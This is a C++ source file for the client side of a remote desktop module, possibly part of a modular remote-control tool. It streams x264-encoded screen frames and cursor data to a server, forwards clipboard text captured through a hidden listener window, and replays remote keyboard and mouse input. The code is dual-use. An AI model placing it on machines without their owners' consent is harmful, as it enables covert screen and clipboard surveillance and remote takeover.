#include "RemoteDesktop.h"
#include "dbg.h"
#include <stdint.h>
#include <stdio.h>
#include"x264.h"


#include <WinUser.h>

#define THREAD_MSG_NEXT_FRAME	(WM_USER + 123)
#define THREAD_MSG_GET_BMP_FILE	(WM_USER + 124)

#define FRAME_QUEUE_SIZE		3


volatile unsigned int CRemoteDesktop::nInstance = 0;


#define MAX_CURSOR_TYPE	16

TCHAR*	CursorResArray[MAX_CURSOR_TYPE] =
{
	IDC_APPSTARTING,
	IDC_ARROW,
	IDC_CROSS,
	IDC_HAND,
	IDC_HELP,
	IDC_IBEAM,
	IDC_ICON,
	IDC_NO,
	IDC_SIZE,
	IDC_SIZEALL,
	IDC_SIZENESW,
	IDC_SIZENS,
	IDC_SIZENWSE,
	IDC_SIZEWE,
	IDC_UPARROW,
	IDC_WAIT
};


CRemoteDesktop::CRemoteDesktop(CClient *pClient,Module * owner) :
CEventHandler(pClient, REMOTEDESKTOP)
{	
	m_hClipbdListenWnd = NULL;
	m_ClipbdListenerThread = NULL;
		
	m_flags = 0;

	m_FrameReqCnt = 0;

	m_hTimerQueue = NULL;
	m_hTimer = NULL;

	m_owner = owner;
	
	m_TimerMutex = 0;

	if (m_owner)
		get_module(m_owner);
}


CRemoteDesktop::~CRemoteDesktop()
{
	if (m_owner)
		put_module(m_owner);
}


void CRemoteDesktop::OnOpen()
{
	int   err = 0;
	int   nMonitor;
	RECT  Monitors[16] = { 0 };
	TCHAR szError[0x100];

	if (InterlockedExchange(&nInstance, 1)){
		//已经有一个实例了.
		wsprintf(szError, TEXT("One instance is already running"));
		Send(REMOTEDESKTOP_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		Send(-1, NULL, 0);
		Close();
		return;
	}

	//剪切板监视.
	m_ClipbdListenerThread = CreateThread(
		0,
		0,
		(LPTHREAD_START_ROUTINE)ClipdListenProc, 
		this, 
		0, 
		0
	);

	
	err = m_gdiCapture.InitGdiDevice();
	if (err < 0){
		wsprintf(szError, TEXT("InitGdiDevice failed with error : %d"), err);
		Send(REMOTEDESKTOP_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}

	nMonitor = m_gdiCapture.GetAllMonitor(Monitors);
	if (nMonitor < 0){
		wsprintf(szError, TEXT("GetAllMonitor failed with error : %d"), nMonitor);
		Send(REMOTEDESKTOP_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}

	//send monitor info to server.
	Send(REMOTEDESKTOP_MONITORS, Monitors, nMonitor * sizeof(Monitors[0]));

	//gdi缩放,并不能获得真正的.
	m_gdiCapture.Cleanup();
}

void CRemoteDesktop::OnClose()
{
	//关闭监听剪切板.
	if (m_hClipbdListenWnd){
		PostMessage(m_hClipbdListenWnd, WM_CLOSE, 0, 0);
		m_hClipbdListenWnd = NULL;
	}

	//等待线程退出
	if (m_ClipbdListenerThread){
		WaitForSingleObject(m_ClipbdListenerThread, INFINITE);
		CloseHandle(m_ClipbdListenerThread);
		m_ClipbdListenerThread = NULL;
	}

	StopCapture();

	InterlockedExchange(&nInstance, 0);
}




#define WM_REMOTE_DESKTOP_SET_CLIPBOARD_TEXT	(WM_USER + 72)

LRESULT CALLBACK CRemoteDesktop::WndProc(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	MyData*		 pMyData	    = (MyData*)GetWindowLongPtr(hWnd,GWL_USERDATA);
	CREATESTRUCT*pCreateStruct  = NULL;
	HWND		 hRemovedWnd    = NULL;
	HWND		 hAfterWnd		= NULL;
	HGLOBAL		 hData		    = NULL;

	switch(uMsg)
	{	
	case WM_CREATE:
		pCreateStruct = (CREATESTRUCT*)lParam;
		//设置UserData,
		SetWindowLong(hWnd,GWL_USERDATA,(LONG)pCreateStruct->lpCreateParams);
		pMyData = (MyData*)GetWindowLongPtr(hWnd,GWL_USERDATA);
		pMyData->m_hNextViewer = SetClipboardViewer(hWnd);
		break;
	case WM_CLOSE:
		//从Viewer chain中摘下
		ChangeClipboardChain(hWnd,pMyData->m_hNextViewer);
		DestroyWindow(hWnd);
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		break;

	case WM_CHANGECBCHAIN:
		//从新调整hNextViewer
		hRemovedWnd = (HWND)wParam;
		hAfterWnd = (HWND)lParam;

		if(hRemovedWnd == pMyData->m_hNextViewer)
		{
			pMyData->m_hNextViewer = hAfterWnd;
		}
		else if(pMyData->m_hNextViewer)
		{
			::SendMessage(pMyData->m_hNextViewer,WM_CHANGECBCHAIN,wParam,lParam);
		}
		break;

	case WM_DRAWCLIPBOARD:

		//剪切板数据改变了:
		if(OpenClipboard(hWnd))
		{
			hData = NULL;
			hData = GetClipboardData(CF_UNICODETEXT);
			if(hData)
			{
				TCHAR*pBuff = (TCHAR*)GlobalLock(hData);
				if(	pBuff && 
					(pMyData->m_SetClipbdText == NULL || lstrcmp(pBuff,pMyData->m_SetClipbdText)))
				{
					//printf("-----------Local ClipboardData Change!------------\n");
					pMyData->m_pThis->SetClipbdText(pBuff);
				}
				GlobalUnlock(hData);
			}
			CloseClipboard();
		}

		if(pMyData->m_hNextViewer)
		{
			SendMessage(pMyData->m_hNextViewer,WM_DRAWCLIPBOARD,wParam,lParam);
		}
		break;

	case WM_REMOTE_DESKTOP_SET_CLIPBOARD_TEXT:
		if(OpenClipboard(hWnd))
		{
			int len = 0;
			//备份数据	
			if(pMyData->m_SetClipbdText)
			{
				free(pMyData->m_SetClipbdText);
				pMyData->m_SetClipbdText = NULL;
			}

			len = sizeof(TCHAR) * (lstrlen((TCHAR*)wParam) + 1);
			pMyData->m_SetClipbdText = (TCHAR*)malloc(len);
			memcpy(pMyData->m_SetClipbdText, (TCHAR*)wParam, len);
			
			//
			EmptyClipboard();
			hData = GlobalAlloc(GHND|GMEM_SHARE,len);
			if(hData)
			{
				BYTE*pBuff = (BYTE*)GlobalLock(hData);
				memcpy(pBuff,pMyData->m_SetClipbdText,len);
				GlobalUnlock(hData);
				//printf("-----------Reset Local ClipboardData !------------\n");
				SetClipboardData(CF_UNICODETEXT,hData);
			}
			CloseClipboard();
		}
		break;
	default:
		return DefWindowProc(hWnd,uMsg,wParam,lParam);
	}
	return 0;
}


void CRemoteDesktop::ClipdListenProc(CRemoteDesktop*pThis)
{
	static int      HasRegistered = 0;
	MSG             msg           = {0};
	HINSTANCE		hInstance     = GetModuleHandle(0);
	HWND			hWnd          = NULL;
	char			szError[256]  = { 0 };

	MyData*			pMyData  = (MyData*)malloc(sizeof(MyData));
	pMyData->m_pThis         = pThis;
	pMyData->m_hNextViewer   = NULL;
	pMyData->m_SetClipbdText = NULL;

	//注册窗口类
	if(HasRegistered == 0)
	{
		WNDCLASS wndclass = {0};
		wndclass.hInstance = hInstance;
		wndclass.lpszClassName = TEXT("ClipbdListener");
		wndclass.lpfnWndProc = WndProc;
		wndclass.style = CS_HREDRAW|CS_VREDRAW;
		HasRegistered = (0 != RegisterClass(&wndclass));
	}

	if(HasRegistered == 0)
	{
		sprintf(szError, "Register Class Failed!:%d", GetLastError());
		return;
	}

	hWnd = CreateWindow(
		TEXT("ClipbdListener"),
		TEXT(""),
		WS_OVERLAPPEDWINDOW,
		0,
		0,
		0,
		0,
		0,
		0,
		hInstance,
		pMyData);

	if(NULL == hWnd)
	{
		sprintf(szError,"Create Window Failed!:%d",GetLastError());
		return;
	}

	ShowWindow(hWnd,SW_HIDE);
	pThis->m_hClipbdListenWnd = hWnd;

	while(GetMessage(&msg,0,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	if (pMyData->m_SetClipbdText)
	{
		free(pMyData->m_SetClipbdText);
		pMyData->m_SetClipbdText = NULL;
	}

	free(pMyData);
	pMyData = NULL;
}

void CRemoteDesktop::OnEvent(UINT32 e, BYTE *lpData, UINT32 Size)
{
	switch (e)
	{
	case REMOTEDESKTOP_NEXT_FRAME:
		OnNextFrame();
		break;
	case REMOTEDESKTOP_START_CAPTURE:
		OnStartCapture(((UINT32*)lpData)[0], ((UINT32*)lpData)[1], ((UINT32*)lpData)[2]);
		break;
	case REMOTEDESKTOP_CTRL:
		OnControl((CtrlParam*)lpData);
		break;
	case REMOTEDESKTOP_SET_CLIPBOARDTEXT:
		OnSetClipbdText((TCHAR*)lpData);
		break;
	case REMOTEDESKTOP_SETFLAG:
		OnSetFlag(*(DWORD*)lpData);
		break;
	default:
		break;
	}
}

void CRemoteDesktop::OnSetClipbdText(TCHAR *szText)
{
	if(m_hClipbdListenWnd)
	{
		SendMessage(
			m_hClipbdListenWnd,
			WM_REMOTE_DESKTOP_SET_CLIPBOARD_TEXT,
			(WPARAM)szText,
			(LPARAM)0
		);
	}
}

void CRemoteDesktop::SetClipbdText(TCHAR*szText)
{
	Send(REMOTEDESKTOP_SET_CLIPBOARDTEXT,
		szText,
		sizeof(TCHAR) * (lstrlen(szText) + 1));
}

void CRemoteDesktop::OnSetFlag(DWORD dwFlag)
{
	if (dwFlag & 0x80000000){
		m_flags |= (dwFlag & 0x7fffffff);		//set
	}
	else{
		m_flags &= (~dwFlag);					//clear
	}
}


void CRemoteDesktop::StopCapture()
{
	//Stop capture.
	if (m_hTimer && m_hTimerQueue){
		DeleteTimerQueueTimer(m_hTimerQueue, m_hTimer, NULL);
		m_hTimer = NULL;
	}

	if (m_hTimerQueue){
		DeleteTimerQueue(m_hTimerQueue);
		m_hTimerQueue = NULL;
	}

	while (m_TimerMutex) Sleep(1);

	//close encoder.
	m_encoder.close();

	//release dxgicapture.
	m_gdiCapture.Cleanup();
}



void __stdcall CRemoteDesktop::TimerCallback(PVOID lpParam, BOOLEAN TimerOrWaitFired)
{
	CRemoteDesktop * pThis = (CRemoteDesktop*)lpParam;
	TCHAR	szError[0x100];
	int  err = 0;

	//
	DWORD  flag = 0;
	int width, height;
	uint8_t * lpRGB;
	uint32_t stride;
	uint32_t size;
	uint8_t * encoded_data;
	uint32_t  encoded_size;
	RECT	  rect;

	//send data...
	CURSORINFO ci = { 0 };
	POINT CursorPos = { 0 };
	vec bufs[3];
	BYTE cursorIdx = 0;
	

	//Skip this frame.
	if (InterlockedExchange(&pThis->m_TimerMutex, 1)){
		dbg_log("skip frame");
		return;
	}

	if (pThis->m_FrameReqCnt <= 0){
		InterlockedExchange(&pThis->m_TimerMutex, 0);
		return;
	}

	//get desktop frame.
	if (pThis->m_flags & FLAG_CAPTURE_TRANSPARENTWND)
	{
		flag |= CAPTUREBLT;
	}

	err = pThis->m_gdiCapture.GetDesktopFrame(&lpRGB, &stride, &size,flag);

	if (err){
		wsprintf(szError, TEXT("GetDesktopFrame failed with error : %d"), err);
		pThis->Send(
			REMOTEDESKTOP_ERROR,
			szError,
			(sizeof(TCHAR) * (lstrlen(szError) + 1)));
		goto done;
	}

	//encode.
	pThis->m_gdiCapture.GetCurrentMonitorSize(&width, &height);

	err = pThis->m_encoder.encode(lpRGB, 32, stride, width, height, &encoded_data, &encoded_size);
	if (err){
		wsprintf(szError, TEXT("encode failed with error : %d"), err);
		pThis->Send(
			REMOTEDESKTOP_ERROR,
			szError,
			(sizeof(TCHAR) * (lstrlen(szError) + 1)));
		goto done;
	}

	//send frame.
	ci.cbSize = sizeof(ci);
	GetCursorInfo(&ci);

	/*
		这个地方很坑,dxgi那个就能获取正确的坐标,这个就不行....
	*/

	GetCursorPos(&CursorPos);

	pThis->m_gdiCapture.GetCurrentMonitorRect(&rect);

	if (CursorPos.x > rect.left &&
		CursorPos.x < rect.right &&
		CursorPos.y > rect.top &&
		CursorPos.y < rect.bottom
		)
	{
		cursorIdx = pThis->getCurCursorIdx(ci.hCursor);
		CursorPos.x -= rect.left;
		CursorPos.y -= rect.top;


		dbg_log("%d %d", CursorPos.x, CursorPos.y);
	}
	else
	{
		cursorIdx = 0xff;
	}
	
	bufs[0].lpData = &cursorIdx;
	bufs[0].Size   = sizeof(cursorIdx);

	bufs[1].lpData = &CursorPos;
	bufs[1].Size   = sizeof(CursorPos);

	bufs[2].lpData = encoded_data;
	bufs[2].Size   = encoded_size;

	pThis->Send(REMOTEDESKTOP_FRAME, bufs, 3);

done:
	InterlockedDecrement(&pThis->m_FrameReqCnt);
	InterlockedExchange(&pThis->m_TimerMutex, 0);
}



void CRemoteDesktop::OnStartCapture(int monitor, UINT fps, UINT quality)
{
	TCHAR szError[0x100];
	int   MonitorSize[2];
	int err;
	int bitrate = 0;

	StopCapture();

	//Init gdi capture
	err = m_gdiCapture.InitCapture(monitor);
	if (err){
		wsprintf(szError, TEXT("InitCapture failed with error : %d"), err);
		Send(REMOTEDESKTOP_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}


	m_gdiCapture.GetCurrentMonitorSize(&MonitorSize[0], &MonitorSize[1]);
	Send(REMOTEDESKTOP_DESKSIZE, MonitorSize, sizeof(MonitorSize));
	
	//Init x264 encoder.
	if (quality == QUALITY_LOW){
		bitrate = MonitorSize[0] * MonitorSize[1] / 1266;
	}

	if (!m_encoder.open(MonitorSize[0], MonitorSize[1], fps, bitrate)){
		wsprintf(szError, TEXT("open x264encoder failed"));
		Send(REMOTEDESKTOP_ERROR,
			szError,
			(sizeof(TCHAR) * (lstrlen(szError) + 1)));
		return;
	}

	//发送窗口大小.
	m_FrameReqCnt = 2;

	//Create timer..
	m_TimerPerFrame = 1000 / fps;
	m_hTimerQueue = CreateTimerQueue();

	if (!m_hTimerQueue)
	{
		wsprintf(szError, TEXT("CreateTimerQueue failed with error : %d"), GetLastError());
		Send(REMOTEDESKTOP_ERROR,
			szError,
			(sizeof(TCHAR) * (lstrlen(szError) + 1)));
		return;
	}

	if (!CreateTimerQueueTimer(
		&m_hTimer, 
		m_hTimerQueue, 
		TimerCallback, 
		this, 
		m_TimerPerFrame, 
		m_TimerPerFrame, 
		0))
	{
		wsprintf(szError, TEXT("CreateTimerQueueTimer failed with error : %d"), GetLastError());
		Send(REMOTEDESKTOP_ERROR,
			szError,
			(sizeof(TCHAR) * (lstrlen(szError) + 1)));
		return;
	}
}

int CRemoteDesktop::getCurCursorIdx(HCURSOR hCursor)
{
	for (int i = 0; i < MAX_CURSOR_TYPE; i++)
	{
		if (LoadCursor(NULL, CursorResArray[i]) == hCursor)
		{
			return i;
		}
	}
	return 1; //IDC_ARROW;
}

void CRemoteDesktop::OnNextFrame()
{
	InterlockedIncrement(&m_FrameReqCnt);
}

//void CRemoteDesktop::OnScreenShot()
//{
//	//PostThreadMessage(m_dwWorkThreadId, THREAD_MSG_GET_BMP_FILE, 0, 0);
//}

void CRemoteDesktop::OnControl(CtrlParam*pParam)
{
	int x, y;
	RECT rect = { 0 };

	// 获取虚拟屏幕的宽度和高度
	int virtualScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	int virtualScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);

	//为什么有问题???????
	m_gdiCapture.GetCurrentMonitorRect(&rect);

	x = LOWORD(pParam->Param.dwCoor) + rect.left;
	y = HIWORD(pParam->Param.dwCoor) + rect.top;

	x = x * 1.0 / virtualScreenWidth * 65535;
	y = y * 1.0 / virtualScreenHeight * 65535;

	switch (pParam->dwType)
	{
	case WM_KEYDOWN:
		keybd_event(pParam->Param.VkCode, 0, 0, 0);
		break;
	case WM_KEYUP:
		keybd_event(pParam->Param.VkCode, 0, KEYEVENTF_KEYUP, 0);
		break;
		//鼠标移动
	case WM_MOUSEMOVE:
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_VIRTUALDESK,
			x,
			y,
			0,
			0);
		break;
		//左键操作
	case WM_LBUTTONDOWN:
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_VIRTUALDESK,
			x,
			y,
			0,
			0);
		break;
	case WM_LBUTTONUP:
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP | MOUSEEVENTF_VIRTUALDESK,
			x,
			y,
			0,
			0);
		break;
	case WM_LBUTTONDBLCLK:
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP | MOUSEEVENTF_VIRTUALDESK,
			x,
			y,
			0,
			0);
		Sleep(100);
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP | MOUSEEVENTF_VIRTUALDESK,
			x,
			y,
			0,
			0);
		break;
		//右键操作
	case WM_RBUTTONDOWN:
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_VIRTUALDESK,
			x,
			y,
			0,
			0);
		break;
	case WM_RBUTTONUP:
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTUP | MOUSEEVENTF_VIRTUALDESK,
			x,
			y,
			0,
			0);
		break;
	case WM_RBUTTONDBLCLK:
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP | MOUSEEVENTF_VIRTUALDESK,
			x,
			y,
			0,
			0);
		Sleep(100);
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP | MOUSEEVENTF_VIRTUALDESK,
			x,
			y,
			0,
			0);
		break;
		//中键操作
	case WM_MBUTTONDOWN:
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN | MOUSEEVENTF_VIRTUALDESK,
			0,
			0,
			0,
			0);
		break;
	case WM_MBUTTONUP:
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEUP | MOUSEEVENTF_VIRTUALDESK,
			0,
			0,
			0,
			0);
		break;
	case WM_MBUTTONDBLCLK:
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN | MOUSEEVENTF_MIDDLEUP | MOUSEEVENTF_VIRTUALDESK,
			0,
			0,
			0,
			0);
		Sleep(100);
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN | MOUSEEVENTF_MIDDLEUP | MOUSEEVENTF_VIRTUALDESK,
			0,
			0,
			0,
			0);
		break;
		//
	case WM_MOUSEWHEEL:		//mouse wheel
		mouse_event(
			MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_WHEEL | MOUSEEVENTF_VIRTUALDESK,
			0,
			0,
			pParam->dwExtraData,
			0);
		break;
	default:
		break;
	}
}
